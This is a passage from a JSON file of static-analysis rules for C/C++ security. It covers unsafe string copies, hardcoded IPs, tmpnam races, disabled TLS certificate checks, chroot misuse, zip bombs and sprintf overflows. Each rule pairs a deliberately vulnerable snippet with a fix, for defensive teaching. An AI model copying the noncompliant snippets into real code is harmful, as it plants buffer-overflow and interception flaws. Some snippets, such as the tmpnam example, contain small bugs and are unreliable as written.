        "htmlDesc": "<p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means\nthat the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>\ncharacter. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving\naccess to sensitive data or allowing arbitrary code execution.</p>\n<p>The function <code>char *strncpy(char * restrict dest, const char * restrict src, size_t count);</code> copies the first <code>count</code>\ncharacters from <code>src</code> to <code>dest</code>, stopping at the first <code>null</code> character, and filling extra space with 0. The\n<code>wcsncpy</code> does the same for wide characters and should be used with the same guidelines.</p>\n<p>Both of those functions are designed to work with fixed-length strings and might result in a non-<code>null</code>-terminated string.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There is a possibility that either the <code>source</code> or the <code>destination</code> pointer is <code>null</code> </li>\n  <li> The security of your system can be compromised if the <code>destination</code> is a truncated version of the <code>source</code> </li>\n  <li> The <code>source</code> buffer can be both non-<code>null</code>-terminated and smaller than the <code>count</code> </li>\n  <li> The <code>destination</code> buffer can be smaller than the <code>count</code> </li>\n  <li> You expect <code>dest</code> to be a <code>null</code>-terminated string </li>\n  <li> There is an overlap between the <code>source</code> and the <code>destination</code> </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> C11 provides, in its annex K, the <code>strncpy_s</code> and the <code>wcsncpy_s</code> that were designed as safer alternatives to\n  <code>strcpy</code> and <code>wcscpy</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and\n  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.\n  </li>\n  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions </li>\n  <li> If you are using <code>strncpy</code> and <code>wsncpy</code> as a safer version of <code>strcpy</code> and <code>wcscpy</code>, you should\n  instead consider <code>strcpy_s</code> and <code>wcscpy_s</code>, because these functions have several shortcomings:\n    <ul>\n      <li> It’s not easy to detect truncation </li>\n      <li> Too much work is done to fill the buffer with 0, leading to suboptimal performance </li>\n      <li> Unless manually corrected, the <code>dest</code> string might not be <code>null</code>-terminated </li>\n    </ul>  </li>\n  <li> If you want to use <code>strcpy</code> and <code>wcscpy</code> functions and detect if the string was truncated, the pattern is the following:\n    <ul>\n      <li> Set the last character of the buffer to <code>null</code> </li>\n      <li> Call the function </li>\n      <li> Check if the last character of the buffer is still <code>null</code> </li>\n    </ul>  </li>\n  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nint f(char *src) {\n  char dest[256];\n  strncpy(dest, src, sizeof(dest)); // Sensitive: might silently truncate\n  return doSomethingWith(dest);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint f(char *src) {\n  char dest[256];\n  dest[sizeof dest - 1] = 0;\n  strncpy(dest, src, sizeof(dest)); // Compliant\n  if (dest[sizeof dest - 1] != 0) {\n    // Handle error\n  }\n  return doSomethingWith(dest);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/120\">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/HdcxBQ\">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>\n</ul>",
        "severity": "MAJOR"
      },
      "cpp:S1313": {
        "name": "Using hardcoded IP addresses is security-sensitive",
        "htmlDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack’s impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It’s a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\ndbi_conn conn = dbi_conn_new(\"mysql\");\nstring host = \"10.10.0.1\"; // Sensitive\ndbi_conn_set_option(conn, \"host\", host.c_str());\ndbi_conn_set_option(conn, \"host\", \"10.10.0.1\"); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ndbi_conn conn = dbi_conn_new(\"mysql\");\nstring host = getDatabaseHost(); // Compliant\ndbi_conn_set_option(conn, \"host\", host.c_str()); // Compliant\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non-routable address 0.0.0.0 </li>\n  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"http://www.oid-info.com/introduction.htm\">often match\n  Object Identifiers</a> (OID) </li>\n  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a\n  href=\"https://datatracker.ietf.org/doc/html/rfc5737\">RFC 5737</a> </li>\n  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href=\"https://datatracker.ietf.org/doc/html/rfc3849\">RFC\n  3849</a> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "cpp:S5824": {
        "name": "Using \"tmpnam\", \"tmpnam_s\" or \"tmpnam_r\" is security-sensitive",
        "htmlDesc": "<p>The functions \"tmpnam\", \"tmpnam_s\" and \"tmpnam_r\" are all used to return a file name that does not match an existing file, in order for the\napplication to create a temporary file. However, even if the file did not exist at the time those functions were called, it might exist by the time\nthe application tries to use the file name to create the files. This has been used by hackers to gain access to files that the application believed\nwere trustworthy.</p>\n<p>There are alternative functions that, in addition to creating a suitable file name, create and open the file and return the file handler. Such\nfunctions are protected from this attack vector and should be preferred. About the only reason to use these functions would be to create a temporary\nfolder, not a temporary file.</p>\n<p>Additionally, these functions might not be thread-safe, and if you don’t provide them buffers of sufficient size, you will have a buffer\noverflow.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There is a possibility that several threads call any of these functions simultaneously </li>\n  <li> There is a possibility that the resulting file is opened without forcing its creation, meaning that it might have unexpected access rights\n  </li>\n  <li> The buffers passed to these functions are respectively smaller than\n    <ul>\n      <li> <code>L_tmpnam</code> for <code>tmpnam</code> </li>\n      <li> <code>L_tmpnam_s</code> for <code>tmpnam_s</code> </li>\n      <li> <code>L_tmpnam</code> for <code>tmpnam_r</code> </li>\n    </ul>  </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use a function that directly opens the temporary file, such a <code>tmpfile</code>, <code>tmpfile_s</code>, <code>mkstemp</code> or\n  <code>mkstemps</code> (the last two allow more accurate control of the file name). </li>\n  <li> If you can’t get rid of these functions, when using the generated name to open the file, use a function that forces the creation of the file\n  and fails if the file already exists. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nint f(char *tempData) {\n  char *path = tmpnam(NULL); // Sensitive\n  FILE* f = fopen(tmpnam, \"w\");\n  fputs(tempData, f);\n  fclose(f);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint f(char *tempData) {\n  // The file will be opened in \"wb+\" mode, and will be automatically removed on normal program exit\n  FILE* f = tmpfile(); // Compliant\n  fputs(tempData, f);\n  fclose(f);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/377\">CWE-377 - Insecure Temporary File</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/c/CON33-C.+Avoid+race+conditions+when+using+library+functions\">CERT, CON33-C.</a> - Avoid\n  race conditions when using library functions </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/display/c/FIO21-C.+Do+not+create+temporary+files+in+shared+directories\">CERT, FIO21-C.</a> - Do\n  not create temporary files in shared directories </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cpp:S4830": {
        "name": "Server certificates should be verified during SSL/TLS connections",
        "htmlDesc": "<p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.\nCertificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>\n<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted\nentity and intercept, manipulate, or steal the data being transmitted.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to\nbuild this trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can\nexploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s\nserver, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect\nany data your system sends to them, potentially leading to significant data breaches.</p>\n<h4>Loss of data integrity</h4>\n<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data\nin transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious\ncode or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the\nsystem.</p>\n<h2>How to fix it in Botan</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled certificate validation.</p>\n<p>The certificate validation gets disabled by overriding <code>tls_verify_cert_chain</code> with an empty implementation. It is highly recommended to\nuse the original implementation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n#include &lt;botan/tls_client.h&gt;\n#include &lt;botan/tls_callbacks.h&gt;\n#include &lt;botan/tls_session_manager.h&gt;\n#include &lt;botan/tls_policy.h&gt;\n#include &lt;botan/auto_rng.h&gt;\n#include &lt;botan/certstor.h&gt;\n#include &lt;botan/certstor_system.h&gt;\n\nclass Callbacks : public Botan::TLS::Callbacks\n{\n    virtual void tls_verify_cert_chain(\n              const std::vector&lt;Botan::X509_Certificate&gt; &amp;cert_chain,\n              const std::vector&lt;std::shared_ptr&lt;const Botan::OCSP::Response&gt;&gt; &amp;ocsp_responses,\n              const std::vector&lt;Botan::Certificate_Store *&gt; &amp;trusted_roots,\n              Botan::Usage_Type usage,\n              const std::string &amp;hostname,\n              const Botan::TLS::Policy &amp;policy)\n    override  { }\n};\n\nclass Client_Credentials : public Botan::Credentials_Manager { };\n\nvoid connect() {\n    Callbacks callbacks;\n    Botan::AutoSeeded_RNG rng;\n    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);\n    Client_Credentials creds;\n    Botan::TLS::Strict_Policy policy;\n\n    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,\n                              Botan::TLS::Server_Information(\"example.com\", 443),\n                              Botan::TLS::Protocol_Version::TLS_V12); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n#include &lt;botan/tls_client.h&gt;\n#include &lt;botan/tls_callbacks.h&gt;\n#include &lt;botan/tls_session_manager.h&gt;\n#include &lt;botan/tls_policy.h&gt;\n#include &lt;botan/auto_rng.h&gt;\n#include &lt;botan/certstor.h&gt;\n#include &lt;botan/certstor_system.h&gt;\n\nclass Callbacks : public Botan::TLS::Callbacks { };\n\nclass Client_Credentials : public Botan::Credentials_Manager { };\n\nvoid connect() {\n    Callbacks callbacks;\n    Botan::AutoSeeded_RNG rng;\n    Botan::TLS::Session_Manager_In_Memory session_mgr(rng);\n    Client_Credentials creds;\n    Botan::TLS::Strict_Policy policy;\n\n    Botan::TLS::Client client(callbacks, session_mgr, creds, policy, rng,\n                              Botan::TLS::Server_Information(\"example.com\", 443),\n                              Botan::TLS::Protocol_Version::TLS_V12);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>\n<p>To avoid running into problems with invalid certificates, consider the following sections.</p>\n<h4>Using trusted certificates</h4>\n<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list\nof trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no\nadditional code or configuration.</p>\n<h4>Working with self-signed certificates or non-standard CAs</h4>\n<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted\nroots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://botan.randombit.net/handbook/\">Botan</a> - Handbook </li>\n  <li> <a href=\"https://www.feistyduck.com/books/openssl-cookbook/\">OpenSSL</a> - Cookbook </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/295\">CWE-295 - Improper Certificate Validation</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cpp:S5801": {
        "name": "Using \"strcpy\" or \"wcscpy\" is security-sensitive",
        "htmlDesc": "<p>In C, a string is just a buffer of characters, normally using the <code>null</code> character as a sentinel for the end of the string. This means\nthat the developer has to be aware of low-level details such as buffer sizes or having an extra character to store the final <code>null</code>\ncharacter. Doing that correctly and consistently is notoriously difficult and any error can lead to a security vulnerability, for instance, giving\naccess to sensitive data or allowing arbitrary code execution.</p>\n<p>The function <code>char *strcpy(char * restrict dest, const char * restrict src);</code> copies characters from <code>src</code> to\n<code>dest</code>. The <code>wcscpy</code> does the same for wide characters and should be used with the same guidelines.</p>\n<p>Note: the functions <code>strncpy</code> and <code>wcsncpy</code> might look like attractive safe replacements for <code>strcpy</code> and\n<code>wcscpy</code>, but they have their own set of issues (see <a href='/coding_rules#rule_key=cpp%3AS5816'>S5816</a>), and you should probably prefer another more adapted\nalternative.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> There is a possibility that either the source or the destination pointer is <code>null</code> </li>\n  <li> There is a possibility that the source string is not correctly <code>null</code>-terminated, or that its length (including the final\n  <code>null</code> character) can be larger than the size of the destination buffer. </li>\n  <li> There is an overlap between source and destination </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> C11 provides, in its annex K, the <code>strcpy_s</code> and the <code>wcscpy_s</code> that were designed as safer alternatives to\n  <code>strcpy</code> and <code>wcscpy</code>. It’s not recommended to use them in all circumstances, because they introduce a runtime overhead and\n  require to write more code for error handling, but they perform checks that will limit the consequences of calling the function with bad arguments.\n  </li>\n  <li> Even if your compiler does not exactly support annex K, you probably have access to similar functions, for example, <code>strlcpy</code> in\n  FreeBSD </li>\n  <li> If you are writing C++ code, using <code>std::string</code> to manipulate strings is much simpler and less error-prone </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nint f(char *src) {\n  char dest[256];\n  strcpy(dest, src); // Sensitive: might overflow\n  return doSomethingWith(dest);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nint f(char *src) {\n  char *dest = malloc(strlen(src) + 1); // For the final 0\n  strcpy(dest, src); // Compliant: we made sure the buffer is large enough\n  int r= doSomethingWith(dest);\n  free(dest);\n  return r;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/120\">CWE-120 - Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')</a>\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/HdcxBQ\">CERT, STR07-C.</a> - Use the bounds-checking interfaces for string manipulation </li>\n</ul>",
        "severity": "MAJOR"
      },
      "cpp:S5802": {
        "name": "Changing directories improperly when using \"chroot\" is security-sensitive",
        "htmlDesc": "<p>The purpose of creating a jail, the \"virtual root directory\" created with chroot-type functions, is to limit access to the file system by isolating\nthe process inside this jail. However, many chroot function implementations don’t modify the current working directory, thus the process has still\naccess to unauthorized resources outside of the \"jail\".</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application changes the working directory before or after running chroot. </li>\n  <li> The application uses a path inside the jail directory as working directory. </li>\n</ul>\n<p>There is a risk if you answered no to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Change the current working directory to the root directory after switching to a jail directory.</p>\n<h2>Sensitive Code Example</h2>\n<p>The current directory is not changed with the <code>chdir</code> function before or after the creation of a jail with the <code>chroot</code>\nfunction:</p>\n<pre>\nconst char* root_dir = \"/jail/\";\nchroot(root_dir); // Sensitive: no chdir before or after chroot, and missing check of return value\n</pre>\n<p>The <code>chroot</code> or <code>chdir</code> operations could fail and the process still have access to unauthorized resources. The return code\nshould be checked:</p>\n<pre>\nconst char* root_dir = \"/jail/\";\nchroot(root_dir); // Sensitive: missing check of the return value\nconst char* any_dir = \"/any/\";\nchdir(any_dir); // Sensitive: missing check of the return value\n</pre>\n<h2>Compliant Solution</h2>\n<p>To correctly isolate the application into a jail, change the current directory with <code>chdir</code> before the <code>chroot</code> and check the\nreturn code of both functions:</p>\n<pre>\nconst char* root_dir = \"/jail/\";\n\nif (chdir(root_dir) == -1) {\n  exit(-1);\n}\n\nif (chroot(root_dir) == -1) {  // compliant: the current dir is changed to the jail and the results of both functions are checked\n  exit(-1);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/243\">CWE-243 - Creation of chroot Jail Without Changing Working Directory</a> </li>\n  <li> <a href=\"https://man7.org/linux/man-pages/man2/chdir.2.html\">man7.org</a> - chdir </li>\n  <li> <a href=\"https://man7.org/linux/man-pages/man2/chroot.2.html\">man7.org</a> - chroot </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cpp:S5042": {
        "name": "Expanding archive files without controlling resource consumption is security-sensitive",
        "htmlDesc": "<p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can\nlead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of\nuncompressed data. To achieve this extreme <a href=\"https://en.wikipedia.org/wiki/Data_compression_ratio\">compression ratio</a>, attackers will\ncompress irrelevant data (eg: a long string of repeated bytes).</p>\n<h2>Ask Yourself Whether</h2>\n<p>Archives to expand are untrusted and:</p>\n<ul>\n  <li> There is no validation of the number of entries in the archive. </li>\n  <li> There is no validation of the total size of the uncompressed data. </li>\n  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>\n  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in\n  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n#include &lt;archive.h&gt;\n#include &lt;archive_entry.h&gt;\n// ...\n\nvoid f(const char *filename, int flags) {\n  struct archive_entry *entry;\n  struct archive *a = archive_read_new();\n  struct archive *ext = archive_write_disk_new();\n  archive_write_disk_set_options(ext, flags);\n  archive_read_support_format_tar(a);\n\n  if ((archive_read_open_filename(a, filename, 10240))) {\n    return;\n  }\n\n  for (;;) {\n    int r = archive_read_next_header(a, &amp;entry);\n    if (r == ARCHIVE_EOF) {\n      break;\n    }\n    if (r != ARCHIVE_OK) {\n      return;\n    }\n  }\n  archive_read_close(a);\n  archive_read_free(a);\n\n  archive_write_close(ext);\n  archive_write_free(ext);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n#include &lt;archive.h&gt;\n#include &lt;archive_entry.h&gt;\n// ...\n\nint f(const char *filename, int flags) {\n  const int max_number_of_extraced_entries = 1000;\n  const int64_t max_file_size = 1000000000; // 1 GB\n\n  int number_of_extraced_entries = 0;\n  int64_t total_file_size = 0;\n\n  struct archive_entry *entry;\n  struct archive *a = archive_read_new();\n  struct archive *ext = archive_write_disk_new();\n  archive_write_disk_set_options(ext, flags);\n  archive_read_support_format_tar(a);\n  int status = 0;\n\n  if ((archive_read_open_filename(a, filename, 10240))) {\n    return -1;\n  }\n\n  for (;;) {\n    number_of_extraced_entries++;\n    if (number_of_extraced_entries &gt; max_number_of_extraced_entries) {\n      status = 1;\n      break;\n    }\n\n    int r = archive_read_next_header(a, &amp;entry);\n    if (r == ARCHIVE_EOF) {\n      break;\n    }\n    if (r != ARCHIVE_OK) {\n      status = -1;\n      break;\n    }\n\n    int file_size = archive_entry_size(entry);\n    total_file_size += file_size;\n    if (total_file_size &gt; max_file_size) {\n      status = 1;\n      break;\n    }\n  }\n  archive_read_close(a);\n  archive_read_free(a);\n\n  archive_write_close(ext);\n  archive_write_free(ext);\n\n  return status;\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/409\">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>\n  <li> <a href=\"https://www.bamsoftware.com/hacks/zipbomb/\">bamsoftware.com</a> - A better Zip Bomb </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cpp:S6069": {
        "name": "\"sprintf\" should not be used",
        "htmlDesc": "<p>When using <code>sprintf</code> , it’s up to the developer to make sure the size of the buffer to be written to is large enough to avoid buffer\noverflows. Buffer overflows can cause the program to crash at a minimum. At worst, a carefully crafted overflow can cause malicious code to be\nexecuted.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> if the provided buffer is large enough for the result of any possible call to the <code>sprintf</code> function (including all possible format\n  strings and all possible additional arguments). </li>\n</ul>\n<p>There is a risk if you answered no to the above question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>There are fundamentally safer alternatives. <code>snprintf</code> is one of them. It takes the size of the buffer as an additional argument,\npreventing the function from overflowing the buffer.</p>\n<ul>\n  <li> Use <code>snprintf</code> instead of <code>sprintf</code>. The slight performance overhead can be afforded in a vast majority of projects.\n  </li>\n  <li> Check the buffer size passed to <code>snprintf</code>. </li>\n</ul>\n<p>If you are working in C++, other safe alternative exist:</p>\n<ul>\n  <li> <code>std::string</code> should be the prefered type to store strings </li>\n  <li> You can format to a string using <code>std::ostringstream</code> </li>\n  <li> Since C++20, <code>std::format</code> is also available to format strings </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nsprintf(str, \"%s\", message);   // Sensitive: `str` buffer size is not checked and it is vulnerable to overflows\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nsnprintf(str, sizeof(str), \"%s\", message); // Prevent overflows by enforcing a maximum size for `str` buffer\n</pre>\n<h2>Exceptions</h2>\n<p>It is a very common and acceptable pattern to compute the required size of the buffer with a call to <code>snprintf</code> with the same arguments\ninto an empty buffer (this will fail, but return the necessary size), then to call <code>sprintf</code> as the bound check is not needed anymore. Note\nthat 1 needs to be added by the size reported by <code>snprintf</code> to account for the terminal null character.</p>\n<pre>\nsize_t buflen = snprintf(0, 0, \"%s\", message);\nchar* buf = malloc(buflen + 1); // For the final 0\nsprintf(buf, \"%s\", message);{code}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\">Top 10 2021 Category A6 - Vulnerable and Outdated\n  Components</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/676\">CWE-676 - Use of Potentially Dangerous Function</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/119\">CWE-119 - Improper Restriction of Operations within the Bounds of a Memory\n  Buffer</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "cpp:S5332": {
        "name": "Using clear-text protocols is security-sensitive",
